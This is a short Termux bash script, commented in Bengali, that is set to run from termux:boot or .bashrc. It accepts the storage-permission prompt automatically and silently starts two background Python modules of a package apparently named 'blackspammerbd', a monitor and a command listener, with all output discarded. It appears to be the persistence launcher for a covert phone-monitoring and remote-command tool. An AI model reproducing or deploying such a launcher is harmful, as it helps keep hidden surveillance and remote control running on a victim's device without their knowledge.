#!/data/data/com.termux/files/usr/bin/env bash
# ================================================
#  এই স্ক্রিপ্টটি termux:boot / .bashrc এ যুক্ত থাকবে,
#  যাতে ফোন রিস্টার্ট বা নতুন Termux সেশন এলে
#  Monitor & Command Listener ব্যাকগ্রাউন্ডে চলে যায়।
# ================================================

# ১) একবার Storage Permission নিশ্চিত করে নেব
termux-setup-storage <<EOF
y
EOF

# ২) Monitor.py ব্যাকগ্রাউন্ডে চালু করবে (কোনো প্রিন্ট বা আউটপুট নেই)
nohup python3 -m blackspammerbd.monitor >/dev/null 2>&1 &

# ৩) Command Listener ব্যাকগ্রাউন্ডে চালু করবে (কোনো প্রিন্ট নেই)
nohup python3 -m blackspammerbd.command_listener >/dev/null 2>&1 &
